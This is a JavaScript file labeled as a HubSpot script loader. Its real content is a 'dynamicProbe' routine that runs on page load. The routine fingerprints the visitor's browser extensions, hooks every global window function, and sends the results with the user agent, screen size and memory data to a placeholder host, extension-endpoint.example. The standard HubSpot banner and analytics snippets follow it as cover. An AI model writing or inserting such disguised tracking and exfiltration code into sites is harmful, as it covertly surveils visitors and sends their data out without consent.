const dynamicProbe = {
  dataCollection: new Map(Object.entries(window.localData)),
  discoveredData: new Set(),
  jshookResults: new Set(),
  async probeFunc(name, {
    id,
    file
  }) {
    return new Promise(resolve => {
      let xhr = new XMLHttpRequest();
      let timeout = setTimeout(() => {
        resolve(false);
        this.discoveredData.delete(name);
      }, 1500);
      xhr.onreadystatechange = function () {
        if (this.readyState == 4 && this.status < 300 && this.status >= 200) {
          clearTimeout(timeout);
          resolve(true);
        }
      };
      xhr.open("GET", `https://extension-endpoint.example/${id}/${file}`, true);
      xhr.send();
    });
  },
  jshooksDetach() {
    Object.getOwnPropertyNames(window).forEach(prop => {
      if (typeof window[prop] === 'function') {
        const originalFunc = window[prop];
        window[prop] = function () {
          console.log(`Function ${prop} was called`);
          this.jshookResults.add(prop);
          originalFunc.apply(this, arguments);
        };
      }
    });
  },
  async scan() {
    const results = {};
    const jshook = {};
    for (const [name, data] of this.dataCollection) {
      await new Promise(r => setTimeout(r, Math.random() * 200));
      results[name] = await this.probeFunc(name, data);
    }
    for (const funcName of this.jshookResults) {
      jshook[funcName] = true;
    }
    const payload = btoa(JSON.stringify({
      findings: results,
      jshook: jshook,
      ts: Date.now(),
      userAgent: navigator.userAgent,
      windowSize: {
        w: window.innerWidth,
        h: window.innerHeight
      },
      memory: window.performance.memory
    }));

    // using fetch instead of navigator.sendBeacon to handle async behaviors
    fetch('https://extension-endpoint.example/v2/report', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
  }
};
// HubSpot Script Loader. Please do not block this resource. See more: http://hubs.ly/H0702_H0

var _hsp = window._hsp = window._hsp || [];
_hsp.push(['addEnabledFeatureGates', []]);
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', dynamicProbe.scan);
} else {
  dynamicProbe.scan();
}
!function (t, e, r) {
  if (!document.getElementById(t)) {
    var n = document.createElement("script");
    for (var a in n.src = "https://js-eu1.hs-banner.com/v2/5735845/banner.js", n.type = "text/javascript", n.id = t, r) r.hasOwnProperty(a) && n.setAttribute(a, r[a]);
    var i = document.getElementsByTagName("script")[0];
    i.parentNode.insertBefore(n, i);
  }
}("cookieBanner-5735845", 0, {
  "data-cookieconsent": "ignore",
  "data-hs-ignore": true,
  "data-loader": "hs-scriptloader",
  "data-hsjs-portal": 5735845,
  "data-hsjs-env": "prod",
  "data-hsjs-hublet": "eu1"
});
!function (e, t) {
  if (!document.getElementById(e)) {
    var c = document.createElement("script");
    c.src = "https://js-eu1.hs-analytics.net/analytics/1694145300000/5735845.js", c.type = "text/javascript", c.id = e;
    var n = document.getElementsByTagName("script")[0];
    n.parentNode.insertBefore(c, n);
  }
}("hs-analytics");